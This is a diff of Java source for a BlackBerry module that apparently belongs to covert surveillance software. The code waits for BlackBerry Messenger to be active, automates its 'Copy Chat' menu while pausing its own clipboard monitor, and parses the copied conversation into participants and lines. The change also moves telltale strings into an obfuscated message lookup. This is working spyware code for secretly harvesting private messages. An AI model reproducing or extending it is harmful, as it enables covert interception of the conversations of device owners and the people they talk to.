@@ -9,15 +9,14 @@
 
 package blackberry.module.im;
 
-import java.util.Hashtable;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Messages;
 import blackberry.Status;
-import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -28,7 +27,7 @@ import blackberry.utils.StringUtils;
 
 public class ConversationScreen {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     // Vector<String>
@@ -39,9 +38,12 @@ public class ConversationScreen {
     // Vector<Screen>
     //private Vector conversationScreens = new Vector();
     // Hashtable<Screen,CRC32>
-    Hashtable conversations = new Hashtable();
+    //Hashtable conversations = new Hashtable();
 
     private String lastConversation = null;
+
+    private Object busyLock = new Object();
+    private boolean busy;
 
     public void setBBM(UiApplication bbmApplication) {
         this.bbmApplication = bbmApplication;
@@ -51,7 +53,16 @@ public class ConversationScreen {
      * retrieves the screen, if it's the conversation one, calls the copy and
      * parses the content
      */
-    public synchronized void getConversationScreen() {
+    public void getConversationScreen() {
+
+        synchronized (busyLock) {
+            if (busy) {
+                return;
+            } else {
+                busy = true;
+            }
+        }
+
         try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
                 if (Status.self().wantLight()) {
@@ -63,43 +74,15 @@ public class ConversationScreen {
             Screen screen = bbmApplication.getActiveScreen();
 
             //#ifdef DEBUG
-            debug.info("leech active screen: " + screen);
+            debug.info("leech active screen: " + screen); //$NON-NLS-1$
             //#endif
 
             if (bbmApplication.isForeground()) {
-                if (screen.getClass().getName().indexOf("ConversationScreen") >= 0) {
+                //1g.0=ConversationScreen
+                if (screen.getClass().getName()
+                        .indexOf(Messages.getString("1g.0")) >= 0) { //$NON-NLS-1$
 
                     String newConversation = extractConversation(screen);
-
-                    if (!conversations.containsKey(screen)) {
-                        //#ifdef DEBUG
-                        debug.info("Added new conversation screen: " + screen);
-                        //#endif
-                        conversations.put(screen,
-                                new Integer(Encryption.CRC32(newConversation)));
-
-                        // exploreField(screen, 0, new String[0]);
-                    } else {
-                        // se conversation e' uguale all'ultima parsata non fare niente.
-                        //#ifdef DBC
-                        Check.asserts(conversations.containsKey(screen),
-                                "conversation doesn't contain screen");
-                        //#endif
-
-                        //#ifdef DEBUG
-                        debug.trace("getConversationScreen screen: "
-                                + conversations.get(screen));
-                        //#endif
-
-                        Integer hash = (Integer) conversations.get(screen);
-                        if (hash.equals(new Integer(Encryption
-                                .CRC32(newConversation)))) {
-                            //#ifdef DEBUG
-                            debug.trace("getConversationScreen: equal conversation, ignore it");
-                            //#endif
-                            return;
-                        }
-                    }
 
                     // parse della conversazione.
                     // result e' un vettore di stringhe
@@ -110,11 +93,11 @@ public class ConversationScreen {
                     if (result != null) {
                         //#ifdef DBC
                         Check.asserts(result.size() == 2,
-                                "wrong size result:  " + result.size());
+                                "wrong size result:  " + result.size()); //$NON-NLS-1$
                         //#endif
 
                         //#ifdef DEBUG
-                        debug.trace("getConversationScreen: extract vector elements");
+                        debug.trace("getConversationScreen: extract vector elements"); //$NON-NLS-1$
                         //#endif
                         String partecipants = (String) result.elementAt(0);
                         Vector lines = (Vector) result.elementAt(1);
@@ -129,7 +112,7 @@ public class ConversationScreen {
                     }
                 } else {
                     //#ifdef DEBUG
-                    debug.trace("getConversationScreen no screen: "
+                    debug.trace("getConversationScreen no screen: " //$NON-NLS-1$
                             + screen.getClass().getName());
                     //#endif
                 }
@@ -143,24 +126,33 @@ public class ConversationScreen {
              */
         } catch (Exception ex) {
             //#ifdef DEBUG
-            debug.error("getConversationScreen: " + ex);
+            debug.error("getConversationScreen: " + ex); //$NON-NLS-1$
             ex.printStackTrace();
             //#endif
 
+        } finally {
+            synchronized (busyLock) {
+                busy = false;
+            }
         }
+        //#ifdef DEBUG
+        debug.trace("getConversationScreen: end");
+        //#endif
         return;
     }
 
     private String extractConversation(Screen screen) {
         //#ifdef DEBUG
-        debug.trace("extractConversation");
+        debug.trace("extractConversation"); //$NON-NLS-1$
         //#endif
 
         //String before = (String) Clipboard.getClipboard().get();
         String clip = null;
         // debug.trace("try copy chat: "+screen);
         ((ModuleClipboard) ModuleClipboard.getInstance()).suspendClip();
-        if (MenuWalker.walk(new String[] { "Copy Chat", "Copy History" },
+        if (MenuWalker
+                .walk(new String[] {
+                        Messages.getString("1g.1"), Messages.getString("1g.2") }, //$NON-NLS-1$ //$NON-NLS-2$
                 screen, true)) {
 
             clip = (String) Clipboard.getClipboard().get();
@@ -170,13 +162,13 @@ public class ConversationScreen {
                 //Clipboard.getClipboard().put(before);
             } catch (Exception ex) {
                 //#ifdef DEBUG
-                debug.error("extractConversation: clip " + ex);
+                debug.error("extractConversation: clip " + ex); //$NON-NLS-1$
                 //#endif
             }
 
         } else {
             //#ifdef DEBUG
-            debug.info("NO Conversation screen!");
+            debug.info("NO Conversation screen!"); //$NON-NLS-1$
             //#endif
         }
         ((ModuleClipboard) ModuleClipboard.getInstance()).resumeClip();
@@ -186,6 +178,7 @@ public class ConversationScreen {
     public static Vector parseConversation(String newConversation) {
         return parseConversation(newConversation, null);
     }
+
     /**
      * parse conversation
      * 
@@ -198,7 +191,7 @@ public class ConversationScreen {
 
         //#ifdef DBC
         Check.requires(newConversation != null,
-                "parseConversation, null newCoversation");
+                "parseConversation, null newCoversation"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
@@ -206,8 +199,8 @@ public class ConversationScreen {
         if (lastConversation != null) {
             lastLen = lastConversation.length();
         }
-        debug.trace("parseConversation new: " + newConversation.length()
-                + " last: " + lastLen);
+        debug.trace("parseConversation new: " + newConversation.length() //$NON-NLS-1$
+                + " last: " + lastLen); //$NON-NLS-1$
         //#endif
 
         String lineConversation = StringUtils.diffStrings(newConversation,
@@ -215,20 +208,21 @@ public class ConversationScreen {
         boolean full;
 
         //#ifdef DEBUG
-        debug.trace("parseConversation lineConversation: " + lineConversation);
+        debug.trace("parseConversation lineConversation: " + lineConversation); //$NON-NLS-1$
         //#endif
 
-        if (lineConversation.startsWith("Participants")) {
+        //1g.3=Participants
+        if (lineConversation.startsWith(Messages.getString("1g.3"))) { //$NON-NLS-1$
             full = true;
             //#ifdef DEBUG
-            debug.trace("parseConversation: full");
+            debug.trace("parseConversation: full"); //$NON-NLS-1$
             //#endif
             return parseFullConversation(newConversation);
 
         } else {
             full = false;
             //#ifdef DEBUG
-            debug.trace("parseConversation: partial");
+            debug.trace("parseConversation: partial"); //$NON-NLS-1$
             //#endif
             return parseLinesConversation(lineConversation, 0);
         }
@@ -246,13 +240,13 @@ public class ConversationScreen {
             int posMessages) {
         try {
             //#ifdef DEBUG
-            debug.trace("parseLinesConversation: " + conversation);
-            debug.trace("parseLinesConversation posMessages=" + posMessages);
+            debug.trace("parseLinesConversation: " + conversation); //$NON-NLS-1$
+            debug.trace("parseLinesConversation posMessages=" + posMessages); //$NON-NLS-1$
             //#endif
 
             //#ifdef DBC
-            Check.requires(partecipants != null, "null partecipants");
-            Check.requires(parts != null && parts.size() > 1, "null parts");
+            Check.requires(partecipants != null, "null partecipants"); //$NON-NLS-1$
+            Check.requires(parts != null && parts.size() > 1, "null parts"); //$NON-NLS-1$
             //#endif
             Vector result = new Vector();
 
@@ -267,13 +261,13 @@ public class ConversationScreen {
             //   senno' 
             //       last += current
             // elabora la last
-            String lastLine = "";
+            String lastLine = ""; //$NON-NLS-1$
             while (true) {
                 String currentLine = StringUtils.getNextLine(conversation,
                         posMessages);
                 if (currentLine == null) {
                     //#ifdef DEBUG
-                    debug.trace("parseLinesConversation null line, posMessage: "
+                    debug.trace("parseLinesConversation null line, posMessage: " //$NON-NLS-1$
                             + posMessages);
                     //#endif
                     break;
@@ -282,7 +276,7 @@ public class ConversationScreen {
 
                 //if (numLine < 5) {
                 //#ifdef DEBUG
-                debug.trace("line " + numLine + " : " + currentLine);
+                debug.trace("line " + numLine + " : " + currentLine); //$NON-NLS-1$ //$NON-NLS-2$
                 //#endif
                 //}
                 numLine += 1;
@@ -293,27 +287,27 @@ public class ConversationScreen {
                     // c'e' un partecipante
                     // elabora la linea precedente
                     //#ifdef DEBUG
-                    debug.trace("parseConversation part line: " + currentLine);
+                    debug.trace("parseConversation part line: " + currentLine); //$NON-NLS-1$
                     //#endif
                     String ll = lastLine.trim();
                     if (!StringUtils.empty(ll)) {
                         //#ifdef DEBUG
-                        debug.trace("parseLinesConversation adding last line: "
+                        debug.trace("parseLinesConversation adding last line: " //$NON-NLS-1$
                                 + ll);
                         //#endif
                         lines.addElement(ll);
                     } else {
                         //#ifdef DEBUG
-                        debug.trace("parseLinesConversation last: empty line");
+                        debug.trace("parseLinesConversation last: empty line"); //$NON-NLS-1$
                         //#endif
                     }
                     lastLine = currentLine;
                 } else {
                     //#ifdef DEBUG
-                    debug.trace("parseConversation increasing line: "
+                    debug.trace("parseConversation increasing line: " //$NON-NLS-1$
                             + currentLine);
                     //#endif
-                    lastLine += " " + currentLine;
+                    lastLine += " " + currentLine; //$NON-NLS-1$
                 }
 
             }
@@ -321,26 +315,26 @@ public class ConversationScreen {
             String ll = lastLine.trim();
             if (!StringUtils.empty(ll)) {
                 //#ifdef DEBUG
-                debug.trace("parseLinesConversation adding last line: " + ll);
+                debug.trace("parseLinesConversation adding last line: " + ll); //$NON-NLS-1$
                 //#endif
                 lines.addElement(ll);
             }
 
             //agent.add(partecipants, lines);
             //#ifdef DEBUG
-            debug.info("parseLinesConversation num lines: " + lines.size()
-                    + "/" + numLine);
+            debug.info("parseLinesConversation num lines: " + lines.size() //$NON-NLS-1$
+                    + "/" + numLine); //$NON-NLS-1$
             //#endif
             result.addElement(partecipants);
             result.addElement(lines);
 
             //#ifdef DBC
-            Check.ensures(result.size() == 2, "wrong size result");
+            Check.ensures(result.size() == 2, "wrong size result"); //$NON-NLS-1$
             //#endif
             return result;
         } catch (Exception ex) {
             //#ifdef DEBUG
-            debug.error("parseConversation: " + ex);
+            debug.error("parseConversation: " + ex); //$NON-NLS-1$
             //#endif
             return null;
         }
@@ -365,22 +359,22 @@ public class ConversationScreen {
         // Whiteberry: grazie
 
         try {
-            int pos = conversation.indexOf("-------------");
+            int pos = conversation.indexOf("-------------"); //$NON-NLS-1$
             //#ifdef DBC
-            Check.asserts(pos >= 0, "no delimiter found");
+            Check.asserts(pos >= 0, "no delimiter found"); //$NON-NLS-1$
             //#endif
 
-            int partStart = conversation.indexOf("\n", pos) + 1;
-            int partSep = conversation.indexOf(", ", partStart);
-            int partEnd = conversation.indexOf("\n", partSep);
+            int partStart = conversation.indexOf("\n", pos) + 1; //$NON-NLS-1$
+            int partSep = conversation.indexOf(", ", partStart); //$NON-NLS-1$
+            int partEnd = conversation.indexOf("\n", partSep); //$NON-NLS-1$
 
             partecipants = conversation.substring(partStart, partEnd).trim();
-            parts = StringUtils.splitVector(partecipants, ", ");
+            parts = StringUtils.splitVector(partecipants, ", "); //$NON-NLS-1$
 
             //#ifdef DBC
             Check.asserts(!StringUtils.empty(partecipants),
-                    "empty partecipants");
-            Check.asserts(parts.size() >= 2, "wrong size parts");
+                    "empty partecipants"); //$NON-NLS-1$
+            Check.asserts(parts.size() >= 2, "wrong size parts"); //$NON-NLS-1$
             //#endif
 
             // lines start at line 6
@@ -390,7 +384,7 @@ public class ConversationScreen {
             return parseLinesConversation(conversation, posMessages);
         } catch (Exception ex) {
             //#ifdef DEBUG
-            debug.error("parseConversation: " + ex);
+            debug.error("parseConversation: " + ex); //$NON-NLS-1$
             //#endif
             return null;
         }
@@ -401,7 +395,7 @@ public class ConversationScreen {
     private static int searchPartecipantsDelimiter(String currentLine) {
         int pos = 0;
 
-        pos = currentLine.indexOf(": ");
+        pos = currentLine.indexOf(": "); //$NON-NLS-1$
         if (pos > 0) {
             String part = currentLine.substring(0, pos);
             if (parts.contains(part)) {
@@ -421,7 +415,7 @@ public class ConversationScreen {
      */
     private static int searchPartecipantIter(String currentLine) {
         //#ifdef DBC
-        Check.requires(parts != null && parts.size() > 1, "empty parts");
+        Check.requires(parts != null && parts.size() > 1, "empty parts"); //$NON-NLS-1$
         //#endif
 
         int pos = 0;
